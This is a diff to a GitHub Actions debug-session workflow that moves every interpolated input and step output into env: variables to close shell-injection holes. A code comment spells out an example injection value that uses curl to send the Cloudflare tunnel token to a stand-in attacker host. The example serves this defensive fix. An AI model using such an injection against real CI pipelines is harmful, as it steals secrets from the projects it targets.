@@ -188,10 +188,11 @@ jobs:
           BREAKPOINT_DEBUG_SHELL: ${{ inputs.debug-shell }}
           BREAKPOINT_DESKTOP: ${{ inputs.desktop }}
           BP_ALLOW_FALLBACK: ${{ inputs.allow-fallback }}
+          BP_TUNNEL_MODE: ${{ inputs.tunnel-mode }}
         run: |
           FLAGS=""
           [ "$BP_ALLOW_FALLBACK" = "true" ] && FLAGS="--allow-fallback"
-          MODE=$(.ci/breakpoint/scripts/select-mode.sh --mode "${{ inputs.tunnel-mode }}" $FLAGS)
+          MODE=$(.ci/breakpoint/scripts/select-mode.sh --mode "$BP_TUNNEL_MODE" $FLAGS)
           echo "mode=$MODE" >> "$GITHUB_OUTPUT"
 
       - name: Install desktop packages
@@ -202,9 +203,11 @@ jobs:
         id: origin
         env:
           DESKTOP_RESOLUTION: ${{ inputs.desktop-resolution }}
+          BP_SERVICES: ${{ inputs.services }}
+          BP_DESKTOP: ${{ inputs.desktop }}
         run: |
           URL=$(.ci/breakpoint/scripts/start-origin.sh --port 8080 \
-            --services "${{ inputs.services }}" --desktop "${{ inputs.desktop }}")
+            --services "$BP_SERVICES" --desktop "$BP_DESKTOP")
           echo "url=$URL" >> "$GITHUB_OUTPUT"
 
       - name: Start debug shell
@@ -212,6 +215,15 @@ jobs:
         if: inputs.debug-shell
         run: .ci/breakpoint/scripts/start-shell.sh --timeout 90
 
+      # EVERY interpolated value is routed through `env:` and referenced as
+      # "$VAR". This is not style. `${{ ... }}` is substituted into the script
+      # TEXT before bash parses it, so a free-text value can close the quote and
+      # run as a sibling command -- and this step's environment holds
+      # BREAKPOINT_TUNNEL_TOKEN. `access-emails` is a `type: string` input, i.e.
+      # arbitrary operator-supplied text, so
+      #     foo"; curl attacker.example/$BREAKPOINT_TUNNEL_TOKEN; echo "
+      # would have exfiltrated the Cloudflare token. Through `env:` the value is
+      # data to bash, never program text. Caught by review of f8478874.
       - name: Start tunnel
         id: tunnel
         env:
@@ -219,10 +231,14 @@ jobs:
           CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
           GITHUB_RUN_ID: ${{ github.run_id }}
           GITHUB_ACTOR: ${{ github.actor }}
+          BP_MODE: ${{ steps.mode.outputs.mode }}
+          BP_ORIGIN: ${{ steps.origin.outputs.url }}
+          BP_LABEL: ${{ inputs.tunnel-label }}
+          BP_ACCESS_EMAILS: ${{ inputs.access-emails }}
         run: |
-          URL=$(.ci/breakpoint/scripts/start-tunnel.sh --mode "${{ steps.mode.outputs.mode }}" \
-            --origin "${{ steps.origin.outputs.url }}" --label "${{ inputs.tunnel-label }}" \
-            --run-id "${{ github.run_id }}" --access-emails "${{ inputs.access-emails }}")
+          URL=$(.ci/breakpoint/scripts/start-tunnel.sh --mode "$BP_MODE" \
+            --origin "$BP_ORIGIN" --label "$BP_LABEL" \
+            --run-id "$GITHUB_RUN_ID" --access-emails "$BP_ACCESS_EMAILS")
           echo "url=$URL" >> "$GITHUB_OUTPUT"
 
       # Decides email-vs-logs BEFORE masking anything, and masks only when the
@@ -236,17 +252,29 @@ jobs:
           AWS_DEFAULT_REGION: ${{ vars.AWS_SES_REGION_EU }}
           SES_FROM: ${{ vars.AWS_SES_FROM }}
           GITHUB_ACTOR: ${{ github.actor }}
+          # Same rule as the tunnel step, and here the values are EXTERNAL:
+          # the tmate strings come from tmate.io and the URL ultimately from
+          # cloudflared's log output, while this step's environment holds the
+          # AWS SES keys. Never interpolate third-party text into script text.
+          BP_URL: ${{ steps.tunnel.outputs.url }}
+          BP_SEND_EMAIL: ${{ inputs.send-email }}
+          BP_DURATION: ${{ inputs.duration }}
+          BP_TMATE_SSH: ${{ steps.shell.outputs.ssh-connection }}
+          BP_TMATE_WEB: ${{ steps.shell.outputs.web-url }}
         run: |
-          .ci/breakpoint/scripts/publish-endpoints.sh --url "${{ steps.tunnel.outputs.url }}" \
-            --send-email "${{ inputs.send-email }}" --duration "${{ inputs.duration }}" \
-            --tmate-ssh "${{ steps.shell.outputs.ssh-connection }}" \
-            --tmate-web "${{ steps.shell.outputs.web-url }}"
+          .ci/breakpoint/scripts/publish-endpoints.sh --url "$BP_URL" \
+            --send-email "$BP_SEND_EMAIL" --duration "$BP_DURATION" \
+            --tmate-ssh "$BP_TMATE_SSH" \
+            --tmate-web "$BP_TMATE_WEB"
 
       - name: Hold session open
         if: ${{ !cancelled() && (success() || inputs.hold-on-failure) }}
+        env:
+          BP_DURATION: ${{ inputs.duration }}
+          BP_ORIGIN: ${{ steps.origin.outputs.url }}
         run: |
-          .ci/breakpoint/scripts/hold-breakpoint.sh --duration-min "${{ inputs.duration }}" \
-            --origin "${{ steps.origin.outputs.url }}"
+          .ci/breakpoint/scripts/hold-breakpoint.sh --duration-min "$BP_DURATION" \
+            --origin "$BP_ORIGIN"
 
       # ONE script call, not a chain of steps: after a cancellation GitHub gives
       # the remaining always() steps only a short grace before SIGKILL, and a
@@ -256,6 +284,8 @@ jobs:
         env:
           BREAKPOINT_TUNNEL_TOKEN: ${{ secrets.BREAKPOINT_TUNNEL_TOKEN }}
           CLOUDFLARE_ACCOUNT_ID: ${{ vars.CLOUDFLARE_ACCOUNT_ID }}
+          BP_LABEL: ${{ inputs.tunnel-label }}
+          GITHUB_RUN_ID: ${{ github.run_id }}
         run: |
-          .ci/breakpoint/scripts/stop-breakpoint.sh --label "${{ inputs.tunnel-label }}" \
-            --run-id "${{ github.run_id }}"
+          .ci/breakpoint/scripts/stop-breakpoint.sh --label "$BP_LABEL" \
+            --run-id "$GITHUB_RUN_ID"
